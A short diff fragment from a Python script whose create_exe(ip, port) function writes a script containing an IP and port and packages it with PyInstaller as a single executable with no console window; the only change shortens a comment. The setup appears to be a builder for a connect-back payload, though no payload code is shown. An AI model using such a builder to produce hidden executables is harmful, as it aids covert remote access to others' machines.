@@ -19,7 +19,7 @@ def create_exe(ip, port):
     
     print(f"[+] Created {script_name} with IP {ip} and Port {port}")
 
-    # Generate EXE using PyInstaller and capture errors
+    # Generate EXE 
     result = os.system(f'pyinstaller --onefile --noconsole {script_name}')
 
     if result != 0:
